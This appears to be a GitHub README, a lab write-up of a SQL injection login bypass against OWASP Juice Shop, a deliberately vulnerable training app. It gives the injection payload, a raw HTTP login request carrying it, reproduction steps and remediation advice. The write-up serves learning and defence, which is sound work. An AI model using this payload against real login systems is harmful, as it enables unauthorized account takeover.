# 🔐 SQL Injection → Admin Account Takeover (OWASP Juice Shop)

## 📌 Overview
This repository demonstrates a **critical SQL Injection vulnerability** identified in the login functionality of OWASP Juice Shop, leading to **authentication bypass and full administrative account takeover**.

The vulnerability was further chained with **user enumeration** and **weak credential practices**, resulting in complete compromise of the admin account.

---

## 🚨 Vulnerability Summary

- **Type:** SQL Injection (Authentication Bypass)
- **Severity:** Critical (CVSS ~9.0+)
- **Category:** Injection (OWASP Top 10)
- **Affected Endpoint:**
- POST /rest/user/login
---

## 🧠 Technical Description

The application fails to properly sanitize user input in the login request.  
This allows attacker-controlled SQL queries to be executed.

By injecting a payload into the `email` field, the authentication logic is bypassed.

### 💣 Payload Used: admin' OR '1'='1'--

### ⚙️ Likely Backend Query:
SELECT * FROM users
WHERE email = 'admin' OR '1'='1'--'
AND password = 'admin123';

Since `'1'='1'` is always TRUE, authentication is bypassed.

---

## ⚙️ Steps to Reproduce

1. Intercept login request using Burp Suite  
2. Modify request payload: POST /rest/user/login
Content-Type: application/json

{
"email": "admin' OR '1'='1'--",
"password": "admin123"
}

4. Forward the request  
5. Observe successful login (HTTP 200)  
6. JWT token is returned → authentication bypass confirmed  

---

## 📸 Proof of Exploitation

### 🔹 SQL Injection Payload Execution
![SQLi](screenshots/sqli_payload.png)

👉 Shows injected payload and successful HTTP 200 response

---

## 📨 Raw HTTP Evidence

### Request:
POST /rest/user/login HTTP/1.1
Content-Type: application/json

{
"email": "admin' OR '1'='1'--",
"password": "admin123"
}

### Response (Key Indicators):
HTTP/1.1 200 OK

{
"authentication": {
"token": "<JWT_TOKEN>"
}
}

✔ Presence of token confirms successful authentication  
✔ No valid credentials required  

---

## 🔍 Additional Findings

### 1. User Enumeration
- Application reveals valid admin email:admin@juice-sh.op
- - No complexity or rate-limiting enforced

---

## ⚔️ Attack Chain

1. Perform SQL Injection → bypass authentication  
2. Identify valid admin account  
3. Conduct credential guessing  
4. Successfully log in as admin  

👉 Result: **Full administrative access**

---

## 💥 Impact Analysis

- Complete admin account takeover  
- Unauthorized access to sensitive data  
- Privilege escalation  
- Potential data manipulation  
- High risk of system compromise  

---

## 🎯 Real-World Attack Scenario

An attacker can exploit SQL Injection to bypass login mechanisms, identify privileged users, and gain full administrative access. This can lead to large-scale data breaches, financial loss, and reputational damage.

---

## 🛠️ Remediation

### ✔ Prevent SQL Injection:
- Use parameterized queries (Prepared Statements)  
- Avoid dynamic SQL query construction  
- Implement strict input validation  

---

### ✔ Strengthen Authentication:
- Enforce strong password policies  
- Implement rate limiting / account lockout  
- Enable Multi-Factor Authentication (MFA)  

---

### ✔ Monitoring & Detection:
- Log failed login attempts  
- Detect abnormal authentication behavior  
- Deploy WAF rules for SQL injection patterns  

---

## 🧰 Tools Used

- Burp Suite  
- Firefox

---

## 📂 Repository Structure
SQLi-Admin-Takeover/
│
├── report/
│ └── SQLi_Report.pdf
│
├── screenshots/
│ └── sqli_payload.png
│
└── README.md


---

## 👨‍💻 Author

**Harish Goud**  
Web Application Security Tester  
Focus: Vulnerability Assessment & Penetration Testing (WAPT)

---

## ⚠️ Disclaimer

This project was performed in a controlled lab environment using OWASP Juice Shop for educational purposes only.
